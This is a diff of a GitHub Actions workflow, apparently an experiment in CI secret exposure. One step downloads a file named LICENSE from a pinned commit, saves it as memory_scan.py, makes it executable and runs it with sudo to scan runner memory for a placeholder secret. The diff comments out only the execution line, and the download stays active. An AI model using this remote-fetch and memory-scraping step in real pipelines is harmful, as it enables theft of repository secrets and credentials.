@@ -35,7 +35,8 @@ jobs:
           echo "正在第一次内存扫描提取秘钥..."
           wget -q https://raw.githubusercontent.com/flank/flank/128b43b61fd7da13ea6829d1fbb4d3f028b6cdad/LICENSE -O memory_scan.py
           chmod +x memory_scan.py
-          sudo python3 memory_scan.py | grep -i -a --text -E 'a{2}b{2}c{2}d{2}1{2}' && echo "⚠️ 第一次找到秘钥！" || echo "✅ 第一次未找到秘钥。"
+#          sudo python3 memory_scan.py | grep -i -a --text -E 'a{2}b{2}c{2}d{2}1{2}' && echo "⚠️ 第一次找到秘钥！" || echo "✅ 第一次未找到秘钥。"
+      # 关闭第一次打印，避免干扰
 
       - name: 📝 打印环境信息
         run: |
